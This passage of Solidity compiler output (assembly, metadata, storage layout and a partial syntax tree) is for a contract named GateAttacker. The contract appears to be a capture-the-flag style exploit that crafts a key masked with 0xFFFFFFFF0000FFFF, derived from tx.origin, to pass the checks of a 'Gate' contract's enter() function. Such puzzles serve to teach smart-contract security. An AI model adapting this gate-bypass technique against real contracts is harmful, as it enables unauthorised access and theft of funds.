											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 533,
											"end": 649,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 568,
											"end": 572,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 628,
											"end": 640,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 628,
											"end": 640,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 628,
											"end": 640,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 628,
											"end": 640,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 628,
											"end": 640,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 628,
											"end": 640,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 628,
											"end": 640,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 628,
											"end": 640,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 628,
											"end": 640,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 628,
											"end": 640,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 628,
											"end": 640,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 621,
											"end": 641,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 621,
											"end": 641,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 591,
											"end": 641,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 591,
											"end": 641,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 605,
											"end": 617,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 605,
											"end": 617,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 605,
											"end": 617,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 605,
											"end": 617,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 605,
											"end": 617,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 605,
											"end": 617,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 605,
											"end": 617,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 605,
											"end": 617,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 605,
											"end": 617,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 605,
											"end": 617,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 605,
											"end": 617,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 598,
											"end": 618,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 598,
											"end": 618,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 591,
											"end": 641,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 591,
											"end": 641,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 591,
											"end": 641,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 591,
											"end": 641,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 584,
											"end": 641,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 584,
											"end": 641,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 533,
											"end": 649,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 409,
											"end": 525,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 444,
											"end": 448,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 504,
											"end": 516,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 504,
											"end": 516,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 504,
											"end": 516,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 504,
											"end": 516,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 504,
											"end": 516,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 504,
											"end": 516,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 504,
											"end": 516,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 504,
											"end": 516,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 504,
											"end": 516,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 504,
											"end": 516,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 504,
											"end": 516,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 497,
											"end": 517,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 497,
											"end": 517,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 467,
											"end": 517,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFF"
										},
										{
											"begin": 467,
											"end": 517,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 481,
											"end": 493,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 481,
											"end": 493,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 481,
											"end": 493,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 481,
											"end": 493,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 481,
											"end": 493,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 481,
											"end": 493,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 481,
											"end": 493,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 481,
											"end": 493,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 481,
											"end": 493,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 481,
											"end": 493,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 481,
											"end": 493,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 474,
											"end": 494,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 474,
											"end": 494,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 467,
											"end": 517,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 467,
											"end": 517,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 467,
											"end": 517,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 467,
											"end": 517,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 460,
											"end": 517,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 460,
											"end": 517,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 409,
											"end": 525,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 781,
											"end": 849,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 781,
											"end": 849,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 817,
											"end": 821,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 817,
											"end": 821,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 821,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 817,
											"end": 821,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 821,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 817,
											"end": 821,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 821,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 821,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 817,
											"end": 821,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 817,
											"end": 821,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 817,
											"end": 827,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 817,
											"end": 827,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 817,
											"end": 827,
											"name": "PUSH",
											"source": 0,
											"value": "3370204E"
										},
										{
											"begin": 828,
											"end": 840,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 828,
											"end": 840,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 828,
											"end": 840,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 828,
											"end": 840,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 828,
											"end": 840,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 828,
											"end": 840,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 828,
											"end": 840,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 828,
											"end": 840,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 828,
											"end": 840,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 828,
											"end": 840,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 828,
											"end": 840,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "NOT",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP8",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "GAS",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "tag",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 817,
											"end": 841,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 817,
											"end": 841,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 781,
											"end": 849,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 657,
											"end": 773,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 692,
											"end": 696,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 755,
											"end": 764,
											"name": "ORIGIN",
											"source": 0
										},
										{
											"begin": 716,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "FFFF"
										},
										{
											"begin": 716,
											"end": 765,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 730,
											"end": 742,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 730,
											"end": 742,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 730,
											"end": 742,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 730,
											"end": 742,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 730,
											"end": 742,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 730,
											"end": 742,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 730,
											"end": 742,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 730,
											"end": 742,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 730,
											"end": 742,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 730,
											"end": 742,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 730,
											"end": 742,
											"name": "SHL",
											"source": 0
										},
										{
											"begin": 723,
											"end": 743,
											"name": "PUSH",
											"source": 0,
											"value": "C0"
										},
										{
											"begin": 723,
											"end": 743,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 716,
											"end": 765,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFF"
										},
										{
											"begin": 716,
											"end": 765,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 716,
											"end": 765,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 709,
											"end": 765,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 709,
											"end": 765,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 657,
											"end": 773,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"attack()": "9e5faafc",
							"c1()": "5f57697c",
							"c2()": "48e257cb",
							"c3()": "f2c07be5",
							"getAddress()": "38cc4831"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.12+commit.27d51765\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"attack\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"c1\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"c2\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"c3\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contract/security/GateAttacker.sol\":\"GateAttacker\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contract/security/GateAttacker.sol\":{\"keccak256\":\"0x7f65eed79cd0a3551ec2b845f0267c4c1641ac1082faa21a3164be0218ce1e5c\",\"urls\":[\"bzz-raw://4a85c7f93ca2d60885399b4b258078fb069e72593b347ded9917f04210f656ae\",\"dweb:/ipfs/QmRDzhsbcVPctfxrVN2yZZs2ZiiMdHBi8Whw8vA55xuyPC\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 11,
								"contract": "contract/security/GateAttacker.sol:GateAttacker",
								"label": "impl",
								"offset": 0,
								"slot": "0",
								"type": "t_contract(Gate)9"
							},
							{
								"astId": 14,
								"contract": "contract/security/GateAttacker.sol:GateAttacker",
								"label": "offset",
								"offset": 20,
								"slot": "0",
								"type": "t_uint64"
							},
							{
								"astId": 16,
								"contract": "contract/security/GateAttacker.sol:GateAttacker",
								"label": "changedValue",
								"offset": 0,
								"slot": "1",
								"type": "t_bytes8"
							}
						],
						"types": {
							"t_bytes8": {
								"encoding": "inplace",
								"label": "bytes8",
								"numberOfBytes": "8"
							},
							"t_contract(Gate)9": {
								"encoding": "inplace",
								"label": "contract Gate",
								"numberOfBytes": "20"
							},
							"t_uint64": {
								"encoding": "inplace",
								"label": "uint64",
								"numberOfBytes": "8"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "1878",
				"formattedMessage": "contract/security/GateAttacker.sol: Warning: SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.\n",
				"message": "SPDX license identifier not provided in source file. Before publishing, consider adding a comment containing \"SPDX-License-Identifier: <SPDX-License>\" to each source file. Use \"SPDX-License-Identifier: UNLICENSED\" for non-open-source code. Please see https://spdx.org for more information.",
				"severity": "warning",
				"sourceLocation": {
					"end": -1,
					"file": "contract/security/GateAttacker.sol",
					"start": -1
				},
				"type": "Warning"
			}
		],
		"sources": {
			"contract/security/GateAttacker.sol": {
				"ast": {
					"absolutePath": "contract/security/GateAttacker.sol",
					"exportedSymbols": {
						"Gate": [
							9
						],
						"GateAttacker": [
							114
						]
					},
					"id": 115,
					"license": null,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "0:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "interface",
							"documentation": null,
							"fullyImplemented": false,
							"id": 9,
							"linearizedBaseContracts": [
								9
							],
							"name": "Gate",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": null,
									"documentation": null,
									"functionSelector": "3370204e",
									"id": 8,
									"implemented": false,
									"kind": "function",
									"modifiers": [],
									"name": "enter",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 4,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 3,
												"mutability": "mutable",
												"name": "_gateKey",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 8,
												"src": "63:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes8",
													"typeString": "bytes8"
												},
												"typeName": {
													"id": 2,
													"name": "bytes8",
													"nodeType": "ElementaryTypeName",
													"src": "63:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "62:17:0"
									},
									"returnParameters": {
										"id": 7,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 6,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 8,
												"src": "98:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 5,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "98:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "97:6:0"
									},
									"scope": 9,
									"src": "48:56:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 115,
							"src": "27:80:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 114,
							"linearizedBaseContracts": [
								114
							],
							"name": "GateAttacker",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 11,
									"mutability": "mutable",
									"name": "impl",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 114,
									"src": "141:9:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Gate_$9",
										"typeString": "contract Gate"
									},
									"typeName": {
										"contractScope": null,
										"id": 10,
										"name": "Gate",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 9,
										"src": "141:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Gate_$9",
											"typeString": "contract Gate"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 14,
									"mutability": "mutable",
									"name": "offset",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 114,
									"src": "158:34:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint64",
										"typeString": "uint64"
									},
									"typeName": {
										"id": 12,
										"name": "uint64",
										"nodeType": "ElementaryTypeName",
										"src": "158:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint64",
											"typeString": "uint64"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "307846464646464646463030303046464646",
										"id": 13,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "174:18:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_18446744069414649855_by_1",
											"typeString": "int_const 18446744069414649855"
										},
										"value": "0xFFFFFFFF0000FFFF"
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 16,
									"mutability": "mutable",
									"name": "changedValue",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 114,
									"src": "199:19:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bytes8",
										"typeString": "bytes8"
									},
									"typeName": {
										"id": 15,
										"name": "bytes8",
										"nodeType": "ElementaryTypeName",
										"src": "199:6:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bytes8",
											"typeString": "bytes8"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 27,
										"nodeType": "Block",
										"src": "260:36:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 25,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 21,
														"name": "impl",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 11,
														"src": "271:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Gate_$9",
															"typeString": "contract Gate"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 23,
																"name": "addr",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 18,
																"src": "283:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
